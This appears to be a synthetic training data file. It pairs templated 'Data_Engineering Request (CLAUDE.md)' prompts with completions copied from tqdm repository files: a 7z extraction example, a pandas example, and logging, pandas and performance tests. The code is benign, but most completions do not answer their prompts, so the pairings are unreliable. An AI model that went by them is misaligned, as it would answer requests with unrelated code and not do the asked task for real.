{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n\"\"\"Usage:\n  7zx.py [--help | options] <zipfiles>...\n\nOptions:\n  -h, --help     Print this help and exit\n  -v, --version  Print version and exit\n  -c, --compressed       Use compressed (instead of uncompressed) file sizes\n  -s, --silent   Do not print one row per zip file\n  -y, --yes      Assume yes to all queries (for extraction)\n  -D=<level>, --debug=<level>\n                 Print various types of debugging information. Choices:\n                         CRITICAL|FATAL\n                         ERROR\n                         WARN(ING)\n                         [default: INFO]\n                         DEBUG\n                         NOTSET\n  -d, --debug-trace      Print lots of debugging information (-D NOTSET)\n\"\"\"\nimport io\nimport logging\nimport os\nimport pty\nimport re\nimport subprocess  # nosec\n\nfrom argopt import argopt\n\nfrom tqdm import tqdm\n\n__author__ = \"Casper da Costa-Luis <casper.dcl@physics.org>\"\n__licence__ = \"MPLv2.0\"\n__version__ = \"0.2.2\"\n__license__ = __licence__\n\nRE_SCN = re.compile(r\"([0-9]+)\\s+([0-9]+)\\s+(.*)$\", flags=re.M)\n\n\ndef main():\n    args = argopt(__doc__, version=__version__).parse_args()\n    if args.debug_trace:\n        args.debug = \"NOTSET\"\n    logging.basicConfig(level=getattr(logging, args.debug, logging.INFO),\n                        format='%(levelname)s:%(message)s')\n    log = logging.getLogger(__name__)\n    log.debug(args)\n\n    # Get compressed sizes\n    zips = {}\n    for fn in args.zipfiles:\n        info = subprocess.check_output([\"7z\", \"l\", fn]).strip()  # nosec\n        finfo = RE_SCN.findall(info)  # size|compressed|name\n\n        # builtin test: last line should be total sizes\n        log.debug(finfo)\n        totals = map(int, finfo[-1][:2])\n        # log.debug(totals)\n        for s in range(2):  # size|compressed totals\n            totals_s = sum(map(int, (inf[s] for inf in finfo[:-1])))\n            if totals_s != totals[s]:\n                log.warn(\"%s: individual total %d != 7z total %d\",\n                         fn, totals_s, totals[s])\n        fcomp = {n: int(c if args.compressed else u) for (u, c, n) in finfo[:-1]}\n        # log.debug(fcomp)\n        # zips  : {'zipname' : {'filename' : int(size)}}\n        zips[fn] = fcomp\n\n    # Extract\n    cmd7zx = [\"7z\", \"x\", \"-bd\"]\n    if args.yes:\n        cmd7zx += [\"-y\"]\n    log.info(\"Extracting from %d file(s)\", len(zips))\n    with tqdm(total=sum(sum(fcomp.values()) for fcomp in zips.values()),\n              unit=\"B\", unit_scale=True) as tall:\n        for fn, fcomp in zips.items():\n            md, sd = pty.openpty()\n            ex = subprocess.Popen(  # nosec\n                cmd7zx + [fn],\n                bufsize=1,\n                stdout=md,  # subprocess.PIPE,\n                stderr=subprocess.STDOUT)\n            os.close(sd)\n            with io.open(md, mode=\"rU\", buffering=1) as m:\n                with tqdm(total=sum(fcomp.values()), disable=len(zips) < 2,\n                          leave=False, unit=\"B\", unit_scale=True) as t:\n                    if not hasattr(t, \"start_t\"):  # disabled\n                        t.start_t = tall._time()\n                    while True:\n                        try:\n                            l_raw = m.readline()\n                        except IOError:\n                            break\n                        ln = l_raw.strip()\n                        if ln.startswith(\"Extracting\"):\n                            exname = ln[len(\"Extracting\"):].lstrip()\n                            s = fcomp.get(exname, 0)  # 0 is likely folders\n                            t.update(s)\n                            tall.update(s)\n                        elif ln:\n                            if not any(\n                                    ln.startswith(i)\n                                    for i in (\"7-Zip \", \"p7zip Version \",\n                                              \"Everything is Ok\", \"Folders: \",\n                                              \"Files: \", \"Size: \", \"Compressed: \")):\n                                if ln.startswith(\"Processing archive: \"):\n                                    if not args.silent:\n                                        t.write(t.format_interval(\n                                            t.start_t - tall.start_t) + ' ' +\n                                            ln.replace(\"Processing archive: \", \"\"))\n                                else:\n                                    t.write(ln)\n            ex.wait()\n\n\nmain.__doc__ = __doc__\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "examples/7zx.py", "language": "python", "complexity": "medium", "star_count": 30170, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import numpy as np\nimport pandas as pd\n\nfrom tqdm.auto import tqdm\n\ndf = pd.DataFrame(np.random.randint(0, 100, (100000, 6)))\n\n# Register `pandas.progress_apply` and `pandas.Series.map_apply` with `tqdm`\n# (can use `tqdm.gui.tqdm`, `tqdm.notebook.tqdm`, optional kwargs, etc.)\ntqdm.pandas(desc=\"my bar!\")\n\n# Now you can use `progress_apply` instead of `apply`\n# and `progress_map` instead of `map`\ndf.progress_apply(lambda x: x**2)\n# can also groupby:\n# df.groupby(0).progress_apply(lambda x: x**2)\n\n# -- Source code for `tqdm_pandas` (really simple!)\n# def tqdm_pandas(t):\n#   from pandas.core.frame import DataFrame\n#   def inner(df, func, *args, **kwargs):\n#       t.total = groups.size // len(groups)\n#       def wrapper(*args, **kwargs):\n#           t.update(1)\n#           return func(*args, **kwargs)\n#       result = df.apply(wrapper, *args, **kwargs)\n#       t.close()\n#       return result\n#   DataFrame.progress_apply = inner\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "examples/pandas_progress_apply.py", "language": "python", "complexity": "simple", "star_count": 30170, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# pylint: disable=missing-module-docstring, missing-class-docstring\n# pylint: disable=missing-function-docstring, no-self-use\nimport logging\nimport logging.handlers\nimport sys\nfrom io import StringIO\n\nimport pytest\n\nfrom tqdm import tqdm\nfrom tqdm.contrib.logging import _get_first_found_console_logging_handler\nfrom tqdm.contrib.logging import _TqdmLoggingHandler as TqdmLoggingHandler\nfrom tqdm.contrib.logging import logging_redirect_tqdm, tqdm_logging_redirect\n\nfrom .tests_tqdm import importorskip\n\nLOGGER = logging.getLogger(__name__)\n\nTEST_LOGGING_FORMATTER = logging.Formatter()\n\n\nclass CustomTqdm(tqdm):\n    messages = []\n\n    @classmethod\n    def write(cls, s, **__):  # pylint: disable=arguments-differ\n        CustomTqdm.messages.append(s)\n\n\nclass ErrorRaisingTqdm(tqdm):\n    exception_class = RuntimeError\n\n    @classmethod\n    def write(cls, s, **__):  # pylint: disable=arguments-differ\n        raise ErrorRaisingTqdm.exception_class('fail fast')\n\n\nclass TestTqdmLoggingHandler:\n    def test_should_call_tqdm_write(self):\n        CustomTqdm.messages = []\n        logger = logging.Logger('test')\n        logger.handlers = [TqdmLoggingHandler(CustomTqdm)]\n        logger.info('test')\n        assert CustomTqdm.messages == ['test']\n\n    def test_should_call_handle_error_if_exception_was_thrown(self):\n        patch = importorskip('unittest.mock').patch\n        logger = logging.Logger('test')\n        ErrorRaisingTqdm.exception_class = RuntimeError\n        handler = TqdmLoggingHandler(ErrorRaisingTqdm)\n        logger.handlers = [handler]\n        with patch.object(handler, 'handleError') as mock:\n            logger.info('test')\n            assert mock.called\n\n    @pytest.mark.parametrize('exception_class', [\n        KeyboardInterrupt,\n        SystemExit\n    ])\n    def test_should_not_swallow_certain_exceptions(self, exception_class):\n        logger = logging.Logger('test')\n        ErrorRaisingTqdm.exception_class = exception_class\n        handler = TqdmLoggingHandler(ErrorRaisingTqdm)\n        logger.handlers = [handler]\n        with pytest.raises(exception_class):\n            logger.info('test')\n\n\nclass TestGetFirstFoundConsoleLoggingHandler:\n    def test_should_return_none_for_no_handlers(self):\n        assert _get_first_found_console_logging_handler([]) is None\n\n    def test_should_return_none_without_stream_handler(self):\n        handler = logging.handlers.MemoryHandler(capacity=1)\n        assert _get_first_found_console_logging_handler([handler]) is None\n\n    def test_should_return_none_for_stream_handler_not_stdout_or_stderr(self):\n        handler = logging.StreamHandler(StringIO())\n        assert _get_first_found_console_logging_handler([handler]) is None\n\n    def test_should_return_stream_handler_if_stream_is_stdout(self):\n        handler = logging.StreamHandler(sys.stdout)\n        assert _get_first_found_console_logging_handler([handler]) == handler\n\n    def test_should_return_stream_handler_if_stream_is_stderr(self):\n        handler = logging.StreamHandler(sys.stderr)\n        assert _get_first_found_console_logging_handler([handler]) == handler\n\n\nclass TestRedirectLoggingToTqdm:\n    def test_should_add_and_remove_tqdm_handler(self):\n        logger = logging.Logger('test')\n        with logging_redirect_tqdm(loggers=[logger]):\n            assert len(logger.handlers) == 1\n            assert isinstance(logger.handlers[0], TqdmLoggingHandler)\n        assert not logger.handlers\n\n    def test_should_remove_and_restore_console_handlers(self):\n        logger = logging.Logger('test')\n        stderr_console_handler = logging.StreamHandler(sys.stderr)\n        stdout_console_handler = logging.StreamHandler(sys.stderr)\n        logger.handlers = [stderr_console_handler, stdout_console_handler]\n        with logging_redirect_tqdm(loggers=[logger]):\n            assert len(logger.handlers) == 1\n            assert isinstance(logger.handlers[0], TqdmLoggingHandler)\n        assert logger.handlers == [stderr_console_handler, stdout_console_handler]\n\n    def test_should_inherit_console_logger_formatter(self):\n        logger = logging.Logger('test')\n        formatter = logging.Formatter('custom: %(message)s')\n        console_handler = logging.StreamHandler(sys.stderr)\n        console_handler.setFormatter(formatter)\n        logger.handlers = [console_handler]\n        with logging_redirect_tqdm(loggers=[logger]):\n            assert logger.handlers[0].formatter == formatter\n\n    def test_should_not_remove_stream_handlers_not_for_stdout_or_stderr(self):\n        logger = logging.Logger('test')\n        stream_handler = logging.StreamHandler(StringIO())\n        logger.addHandler(stream_handler)\n        with logging_redirect_tqdm(loggers=[logger]):\n            assert len(logger.handlers) == 2\n            assert logger.handlers[0] == stream_handler\n            assert isinstance(logger.handlers[1], TqdmLoggingHandler)\n        assert logger.handlers == [stream_handler]\n\n\nclass TestTqdmWithLoggingRedirect:\n    def test_should_add_and_remove_handler_from_root_logger_by_default(self):\n        original_handlers = list(logging.root.handlers)\n        with tqdm_logging_redirect(total=1) as pbar:\n            assert isinstance(logging.root.handlers[-1], TqdmLoggingHandler)\n            LOGGER.info('test')\n            pbar.update(1)\n        assert logging.root.handlers == original_handlers\n\n    def test_should_add_and_remove_handler_from_custom_logger(self):\n        logger = logging.Logger('test')\n        with tqdm_logging_redirect(total=1, loggers=[logger]) as pbar:\n            assert len(logger.handlers) == 1\n            assert isinstance(logger.handlers[0], TqdmLoggingHandler)\n            logger.info('test')\n            pbar.update(1)\n        assert not logger.handlers\n\n    def test_should_not_fail_with_logger_without_console_handler(self):\n        logger = logging.Logger('test')\n        logger.handlers = []\n        with tqdm_logging_redirect(total=1, loggers=[logger]):\n            logger.info('test')\n        assert not logger.handlers\n\n    def test_should_format_message(self):\n        logger = logging.Logger('test')\n        console_handler = logging.StreamHandler(sys.stdout)\n        console_handler.setFormatter(logging.Formatter(\n            r'prefix:%(message)s'\n        ))\n        logger.handlers = [console_handler]\n        CustomTqdm.messages = []\n        with tqdm_logging_redirect(loggers=[logger], tqdm_class=CustomTqdm):\n            logger.info('test')\n        assert CustomTqdm.messages == ['prefix:test']\n\n    def test_use_root_logger_by_default_and_write_to_custom_tqdm(self):\n        logger = logging.root\n        CustomTqdm.messages = []\n        with tqdm_logging_redirect(total=1, tqdm_class=CustomTqdm) as pbar:\n            assert isinstance(pbar, CustomTqdm)\n            logger.info('test')\n            assert CustomTqdm.messages == ['test']\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tests/tests_contrib_logging.py", "language": "python", "complexity": "medium", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from tqdm import tqdm\n\nfrom .tests_tqdm import StringIO, closing, importorskip, mark, skip\n\npytestmark = mark.slow\n\nnp = importorskip('numpy')\nrandom = importorskip('numpy.random')\nrand = random.rand\nrandint = random.randint\npd = importorskip('pandas')\n\n\ndef test_pandas_setup():\n    \"\"\"Test tqdm.pandas()\"\"\"\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=True, ascii=True, total=123)\n        series = pd.Series(randint(0, 50, (100,)))\n        series.progress_apply(lambda x: x + 10)\n        res = our_file.getvalue()\n        assert '100/123' in res\n\n\ndef test_pandas_rolling_expanding():\n    \"\"\"Test pandas.(Series|DataFrame).(rolling|expanding)\"\"\"\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=True, ascii=True)\n\n        series = pd.Series(randint(0, 50, (123,)))\n        res1 = series.rolling(10).progress_apply(lambda x: 1, raw=True)\n        res2 = series.rolling(10).apply(lambda x: 1, raw=True)\n        assert res1.equals(res2)\n\n        res3 = series.expanding(10).progress_apply(lambda x: 2, raw=True)\n        res4 = series.expanding(10).apply(lambda x: 2, raw=True)\n        assert res3.equals(res4)\n\n        expects = ['114it']  # 123-10+1\n        for exres in expects:\n            our_file.seek(0)\n            if our_file.getvalue().count(exres) < 2:\n                our_file.seek(0)\n                raise AssertionError(\n                    f\"\\nExpected:\\n{exres} at least twice.\\nIn:\\n{our_file.read()}\\n\")\n\n\ndef test_pandas_series():\n    \"\"\"Test pandas.Series.progress_apply and .progress_map\"\"\"\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=True, ascii=True)\n\n        series = pd.Series(randint(0, 50, (123,)))\n        res1 = series.progress_apply(lambda x: x + 10)\n        res2 = series.apply(lambda x: x + 10)\n        assert res1.equals(res2)\n\n        res3 = series.progress_map(lambda x: x + 10)\n        res4 = series.map(lambda x: x + 10)\n        assert res3.equals(res4)\n\n        expects = ['100%', '123/123']\n        for exres in expects:\n            our_file.seek(0)\n            if our_file.getvalue().count(exres) < 2:\n                our_file.seek(0)\n                raise AssertionError(\n                    f\"\\nExpected:\\n{exres} at least twice.\\nIn:\\n{our_file.read()}\\n\")\n\n\n@mark.filterwarnings(\"ignore:DataFrame.applymap has been deprecated:FutureWarning\")\ndef test_pandas_data_frame():\n    \"\"\"Test pandas.DataFrame.progress_apply and .progress_applymap\"\"\"\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=True, ascii=True)\n        df = pd.DataFrame(randint(0, 50, (100, 200)))\n\n        def task_func(x):\n            return x + 1\n\n        # applymap\n        res1 = df.progress_applymap(task_func)\n        res2 = df.applymap(task_func)\n        assert res1.equals(res2)\n\n        # map\n        if hasattr(df, 'map'):  # pandas>=2.1.0\n            res1 = df.progress_map(task_func)\n            res2 = df.map(task_func)\n            assert res1.equals(res2)\n\n        # apply unhashable\n        res1 = []\n        df.progress_apply(res1.extend)\n        assert len(res1) == df.size\n\n        # apply\n        for axis in [0, 1, 'index', 'columns']:\n            res3 = df.progress_apply(task_func, axis=axis)\n            res4 = df.apply(task_func, axis=axis)\n            assert res3.equals(res4)\n\n        our_file.seek(0)\n        if our_file.read().count('100%') < 3:\n            our_file.seek(0)\n            raise AssertionError(\n                f\"\\nExpected:\\n100% at least three times\\nIn:\\n{our_file.read()}\\n\")\n\n        # apply_map, apply axis=0, apply axis=1\n        expects = ['20000/20000', '200/200', '100/100']\n        for exres in expects:\n            our_file.seek(0)\n            if our_file.getvalue().count(exres) < 1:\n                our_file.seek(0)\n                raise AssertionError(\n                    f\"\\nExpected:\\n{exres} at least once.\\nIn:\\n{our_file.read()}\\n\")\n\n\n@mark.filterwarnings(\n    \"ignore:DataFrameGroupBy.apply operated on the grouping columns:DeprecationWarning\")\ndef test_pandas_groupby_apply():\n    \"\"\"Test pandas.DataFrame.groupby(...).progress_apply\"\"\"\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=False, ascii=True)\n\n        df = pd.DataFrame(randint(0, 50, (500, 3)))\n        df.groupby(0).progress_apply(lambda x: None)\n\n        dfs = pd.DataFrame(randint(0, 50, (500, 3)), columns=list('abc'))\n        dfs.groupby(['a']).progress_apply(lambda x: None)\n\n        df2 = df = pd.DataFrame({'a': randint(1, 8, 10000), 'b': rand(10000)})\n        res1 = df2.groupby(\"a\").apply(np.maximum.reduce)\n        res2 = df2.groupby(\"a\").progress_apply(np.maximum.reduce)\n        assert res1.equals(res2)\n\n        our_file.seek(0)\n\n        # don't expect final output since no `leave` and\n        # high dynamic `miniters`\n        nexres = '100%|##########|'\n        if nexres in our_file.read():\n            our_file.seek(0)\n            raise AssertionError(f\"\\nDid not expect:\\n{nexres}\\nIn:{our_file.read()}\\n\")\n\n    with closing(StringIO()) as our_file:\n        tqdm.pandas(file=our_file, leave=True, ascii=True)\n\n        dfs = pd.DataFrame(randint(0, 50, (500, 3)), columns=list('abc'))\n        dfs.loc[0] = [2, 1, 1]\n        dfs['d'] = 100\n\n        expects = ['500/500', '1/1', '4/4', '4/4']\n        dfs.groupby(dfs.index).progress_apply(lambda x: None)\n        dfs.groupby('d').progress_apply(lambda x: None)\n        dfs.T.groupby(dfs.columns).progress_apply(lambda x: None)\n        dfs.T.groupby([2, 2, 1, 1]).progress_apply(lambda x: None)\n\n        our_file.seek(0)\n        if our_file.read().count('100%') < 4:\n            our_file.seek(0)\n            raise AssertionError(\n                f\"\\nExpected:\\n100% at least four times\\nIn:\\n{our_file.read()}\\n\")\n\n        for exres in expects:\n            our_file.seek(0)\n            if our_file.getvalue().count(exres) < 1:\n                our_file.seek(0)\n                raise AssertionError(\n                    f\"\\nExpected:\\n{exres} at least once.\\nIn:\\n{our_file.read()}\\n\")\n\n\n@mark.filterwarnings(\n    \"ignore:DataFrameGroupBy.apply operated on the grouping columns:DeprecationWarning\")\ndef test_pandas_leave():\n    \"\"\"Test pandas with `leave=True`\"\"\"\n    with closing(StringIO()) as our_file:\n        df = pd.DataFrame(randint(0, 100, (1000, 6)))\n        tqdm.pandas(file=our_file, leave=True, ascii=True)\n        df.groupby(0).progress_apply(lambda x: None)\n\n        our_file.seek(0)\n\n        exres = '100%|##########| 100/100'\n        if exres not in our_file.read():\n            our_file.seek(0)\n            raise AssertionError(f\"\\nExpected:\\n{exres}\\nIn:{our_file.read()}\\n\")\n\n\ndef test_pandas_apply_args_deprecation():\n    \"\"\"Test warning info in\n    `pandas.Dataframe(Series).progress_apply(func, *args)`\"\"\"\n    try:\n        from tqdm import tqdm_pandas\n    except ImportError as err:\n        skip(str(err))\n\n    with closing(StringIO()) as our_file:\n        tqdm_pandas(tqdm(file=our_file, leave=False, ascii=True, ncols=20))\n        df = pd.DataFrame(randint(0, 50, (500, 3)))\n        df.progress_apply(lambda x: None, 1)  # 1 shall cause a warning\n        # Check deprecation message\n        res = our_file.getvalue()\n        assert all(i in res for i in (\n            \"TqdmDeprecationWarning\", \"not supported\",\n            \"keyword arguments instead\"))\n\n\n@mark.filterwarnings(\n    \"ignore:DataFrameGroupBy.apply operated on the grouping columns:DeprecationWarning\")\ndef test_pandas_deprecation():\n    \"\"\"Test bar object instance as argument deprecation\"\"\"\n    try:\n        from tqdm import tqdm_pandas\n    except ImportError as err:\n        skip(str(err))\n\n    with closing(StringIO()) as our_file:\n        tqdm_pandas(tqdm(file=our_file, leave=False, ascii=True, ncols=20))\n        df = pd.DataFrame(randint(0, 50, (500, 3)))\n        df.groupby(0).progress_apply(lambda x: None)\n        # Check deprecation message\n        assert \"TqdmDeprecationWarning\" in our_file.getvalue()\n        assert \"instead of `tqdm_pandas(tqdm(...))`\" in our_file.getvalue()\n\n    with closing(StringIO()) as our_file:\n        tqdm_pandas(tqdm, file=our_file, leave=False, ascii=True, ncols=20)\n        df = pd.DataFrame(randint(0, 50, (500, 3)))\n        df.groupby(0).progress_apply(lambda x: None)\n        # Check deprecation message\n        assert \"TqdmDeprecationWarning\" in our_file.getvalue()\n        assert \"instead of `tqdm_pandas(tqdm, ...)`\" in our_file.getvalue()\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tests/tests_pandas.py", "language": "python", "complexity": "complex", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import sys\nfrom contextlib import contextmanager\nfrom functools import wraps\nfrom time import sleep, time\n\n# Use relative/cpu timer to have reliable timings when there is a sudden load\ntry:\n    from time import process_time\nexcept ImportError:\n    from time import clock\n    process_time = clock\n\nfrom tqdm import tqdm, trange\n\nfrom .tests_tqdm import importorskip, mark, patch_lock, skip\n\npytestmark = mark.slow\n\n\ndef cpu_sleep(t):\n    \"\"\"Sleep the given amount of cpu time\"\"\"\n    start = process_time()\n    while (process_time() - start) < t:\n        pass\n\n\ndef checkCpuTime(sleeptime=0.2):\n    \"\"\"Check if cpu time works correctly\"\"\"\n    if checkCpuTime.passed:\n        return True\n    # First test that sleeping does not consume cputime\n    start1 = process_time()\n    sleep(sleeptime)\n    t1 = process_time() - start1\n\n    # secondly check by comparing to cpusleep (where we actually do something)\n    start2 = process_time()\n    cpu_sleep(sleeptime)\n    t2 = process_time() - start2\n\n    if abs(t1) < 0.0001 and t1 < t2 / 10:\n        checkCpuTime.passed = True\n        return True\n    skip(\"cpu time not reliable on this machine\")\n\n\ncheckCpuTime.passed = False\n\n\n@contextmanager\ndef relative_timer():\n    \"\"\"yields a context timer function which stops ticking on exit\"\"\"\n    start = process_time()\n\n    def elapser():\n        return process_time() - start\n\n    yield lambda: elapser()\n    spent = elapser()\n\n    def elapser():  # NOQA\n        return spent\n\n\ndef retry_on_except(n=3, check_cpu_time=True):\n    \"\"\"decroator for retrying `n` times before raising Exceptions\"\"\"\n    def wrapper(func):\n        \"\"\"actual decorator\"\"\"\n        @wraps(func)\n        def test_inner(*args, **kwargs):\n            \"\"\"may skip if `check_cpu_time` fails\"\"\"\n            for i in range(1, n + 1):\n                try:\n                    if check_cpu_time:\n                        checkCpuTime()\n                    func(*args, **kwargs)\n                except Exception:\n                    if i >= n:\n                        raise\n                else:\n                    return\n        return test_inner\n    return wrapper\n\n\ndef simple_progress(iterable=None, total=None, file=sys.stdout, desc='',\n                    leave=False, miniters=1, mininterval=0.1, width=60):\n    \"\"\"Simple progress bar reproducing tqdm's major features\"\"\"\n    n = [0]  # use a closure\n    start_t = [time()]\n    last_n = [0]\n    last_t = [0]\n    if iterable is not None:\n        total = len(iterable)\n\n    def format_interval(t):\n        mins, s = divmod(int(t), 60)\n        h, m = divmod(mins, 60)\n        return f'{h:d}:{m:02d}:{s:02d}' if h else f'{m:02d}:{s:02d}'\n\n    def update_and_print(i=1):\n        n[0] += i\n        if (n[0] - last_n[0]) >= miniters:\n            last_n[0] = n[0]\n\n            if (time() - last_t[0]) >= mininterval:\n                last_t[0] = time()  # last_t[0] == current time\n\n                spent = last_t[0] - start_t[0]\n                spent_fmt = format_interval(spent)\n                rate = n[0] / spent if spent > 0 else 0\n                rate_fmt = \"%.2fs/it\" % (1.0 / rate) if 0.0 < rate < 1.0 else \"%.2fit/s\" % rate\n\n                frac = n[0] / total\n                percentage = int(frac * 100)\n                eta = (total - n[0]) / rate if rate > 0 else 0\n                eta_fmt = format_interval(eta)\n\n                # full_bar = \"#\" * int(frac * width)\n                barfill = \" \" * int((1.0 - frac) * width)\n                bar_length, frac_bar_length = divmod(int(frac * width * 10), 10)\n                full_bar = '#' * bar_length\n                frac_bar = chr(48 + frac_bar_length) if frac_bar_length else ' '\n\n                file.write(\"\\r%s %i%%|%s%s%s| %i/%i [%s<%s, %s]\" %\n                           (desc, percentage, full_bar, frac_bar, barfill, n[0],\n                            total, spent_fmt, eta_fmt, rate_fmt))\n\n                if n[0] == total and leave:\n                    file.write(\"\\n\")\n                file.flush()\n\n    def update_and_yield():\n        for elt in iterable:\n            yield elt\n            update_and_print()\n\n    update_and_print(0)\n    if iterable is not None:\n        return update_and_yield()\n    return update_and_print\n\n\ndef assert_performance(thresh, name_left, time_left, name_right, time_right):\n    \"\"\"raises if time_left > thresh * time_right\"\"\"\n    if time_left > thresh * time_right:\n        raise ValueError(\n            f'{name_left}: {time_left:f}, {name_right}: {time_right:f}'\n            f', ratio {time_left / time_right:f} > {thresh:f}')\n\n\n@retry_on_except()\ndef test_iter_basic_overhead():\n    \"\"\"Test overhead of iteration based tqdm\"\"\"\n    total = int(1e6)\n\n    a = 0\n    with trange(total) as t:\n        with relative_timer() as time_tqdm:\n            for i in t:\n                a += i\n    assert a == (total ** 2 - total) / 2.0\n\n    a = 0\n    with relative_timer() as time_bench:\n        for i in range(total):\n            a += i\n            sys.stdout.write(str(a))\n\n    assert_performance(3, 'trange', time_tqdm(), 'range', time_bench())\n\n\n@retry_on_except()\ndef test_manual_basic_overhead():\n    \"\"\"Test overhead of manual tqdm\"\"\"\n    total = int(1e6)\n\n    with tqdm(total=total * 10, leave=True) as t:\n        a = 0\n        with relative_timer() as time_tqdm:\n            for i in range(total):\n                a += i\n                t.update(10)\n\n    a = 0\n    with relative_timer() as time_bench:\n        for i in range(total):\n            a += i\n            sys.stdout.write(str(a))\n\n    assert_performance(5, 'tqdm', time_tqdm(), 'range', time_bench())\n\n\ndef worker(total, blocking=True):\n    def incr_bar(x):\n        for _ in trange(total, lock_args=None if blocking else (False,),\n                        miniters=1, mininterval=0, maxinterval=0):\n            pass\n        return x + 1\n    return incr_bar\n\n\n@retry_on_except()\n@patch_lock(thread=True)\ndef test_lock_args():\n    \"\"\"Test overhead of nonblocking threads\"\"\"\n    ThreadPoolExecutor = importorskip('concurrent.futures').ThreadPoolExecutor\n\n    total = 16\n    subtotal = 10000\n\n    with ThreadPoolExecutor() as pool:\n        sys.stderr.write('block ... ')\n        sys.stderr.flush()\n        with relative_timer() as time_tqdm:\n            res = list(pool.map(worker(subtotal, True), range(total)))\n            assert sum(res) == sum(range(total)) + total\n        sys.stderr.write('noblock ... ')\n        sys.stderr.flush()\n        with relative_timer() as time_noblock:\n            res = list(pool.map(worker(subtotal, False), range(total)))\n            assert sum(res) == sum(range(total)) + total\n\n    assert_performance(0.5, 'noblock', time_noblock(), 'tqdm', time_tqdm())\n\n\n@retry_on_except(10)\ndef test_iter_overhead_hard():\n    \"\"\"Test overhead of iteration based tqdm (hard)\"\"\"\n    total = int(1e5)\n\n    a = 0\n    with trange(total, leave=True, miniters=1,\n                mininterval=0, maxinterval=0) as t:\n        with relative_timer() as time_tqdm:\n            for i in t:\n                a += i\n    assert a == (total ** 2 - total) / 2.0\n\n    a = 0\n    with relative_timer() as time_bench:\n        for i in range(total):\n            a += i\n            sys.stdout.write((\"%i\" % a) * 40)\n\n    assert_performance(130, 'trange', time_tqdm(), 'range', time_bench())\n\n\n@retry_on_except(10)\ndef test_manual_overhead_hard():\n    \"\"\"Test overhead of manual tqdm (hard)\"\"\"\n    total = int(1e5)\n\n    with tqdm(total=total * 10, leave=True, miniters=1,\n              mininterval=0, maxinterval=0) as t:\n        a = 0\n        with relative_timer() as time_tqdm:\n            for i in range(total):\n                a += i\n                t.update(10)\n\n    a = 0\n    with relative_timer() as time_bench:\n        for i in range(total):\n            a += i\n            sys.stdout.write((\"%i\" % a) * 40)\n\n    assert_performance(130, 'tqdm', time_tqdm(), 'range', time_bench())\n\n\n@retry_on_except(10)\ndef test_iter_overhead_simplebar_hard():\n    \"\"\"Test overhead of iteration based tqdm vs simple progress bar (hard)\"\"\"\n    total = int(1e4)\n\n    a = 0\n    with trange(total, leave=True, miniters=1,\n                mininterval=0, maxinterval=0) as t:\n        with relative_timer() as time_tqdm:\n            for i in t:\n                a += i\n    assert a == (total ** 2 - total) / 2.0\n\n    a = 0\n    s = simple_progress(range(total), leave=True,\n                        miniters=1, mininterval=0)\n    with relative_timer() as time_bench:\n        for i in s:\n            a += i\n\n    assert_performance(10, 'trange', time_tqdm(), 'simple_progress', time_bench())\n\n\n@retry_on_except(10)\ndef test_manual_overhead_simplebar_hard():\n    \"\"\"Test overhead of manual tqdm vs simple progress bar (hard)\"\"\"\n    total = int(1e4)\n\n    with tqdm(total=total * 10, leave=True, miniters=1,\n              mininterval=0, maxinterval=0) as t:\n        a = 0\n        with relative_timer() as time_tqdm:\n            for i in range(total):\n                a += i\n                t.update(10)\n\n    simplebar_update = simple_progress(total=total * 10, leave=True,\n                                       miniters=1, mininterval=0)\n    a = 0\n    with relative_timer() as time_bench:\n        for i in range(total):\n            a += i\n            simplebar_update(10)\n\n    assert_performance(10, 'tqdm', time_tqdm(), 'simple_progress', time_bench())\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tests/tests_perf.py", "language": "python", "complexity": "complex", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
